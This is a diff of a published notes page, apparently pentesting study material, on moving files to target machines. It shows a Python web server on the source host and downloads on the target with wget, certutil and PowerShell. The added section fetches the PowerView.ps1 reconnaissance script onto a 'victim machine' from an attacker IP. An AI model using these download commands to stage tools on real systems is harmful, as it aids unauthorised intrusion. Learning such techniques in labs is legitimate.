@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/notes/transfer-files/"}
+{"dg-publish":true,"permalink":"/notes/transfer-files/","dg-note-properties":{}}
 ---
 
 # To linux
@@ -15,7 +15,7 @@ python -m http.server 4545
 ```
 <!--ID: 1728611164654-->
 
-On the destination machine
+On the **destination** machine, using [[wget\|wget]] (linux)
 ```shell
 wget http://IP_SOURCE_MACHINE:4545/file.txt
 ```
@@ -106,5 +106,45 @@ certutil.exe -urlcache -f http://IP:PORT//file.exe file.exe
 - https://winscp.net/eng/index.php
 
 </div></div>
+
+## Using [[PowerShell\|PowerShell]]
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+## Transfer files
+Run a web server **on the source machine**.
+
+<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
+
+
+
+## Run a web server
+Run a web server on default port `8000`
+```python
+python -m http.server
+```
+Specify another port and folder to host
+```python
+python -m http.server 4545 --directory /home/cry0l1t3/target_files
+```
+
+</div></div>
+
+
+Get the file with [[PowerShell\|PowerShell]] **on the victim machine**
+```powershell
+Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"
+```
+Alternative **Net.WebClient**:
+- Uses the .NET string Net.WebClient to **download** a **file** from the URL specified
+- *Tools.zip* is the exact **file name** itself
+```powershell
+(New-Object Net.WebClient).DownloadFile("https://website-to- visit\tools.zip", "Tools.zip")
+```
+
+</div></div>
+
 
 # [[Metasploit\|Metasploit]]
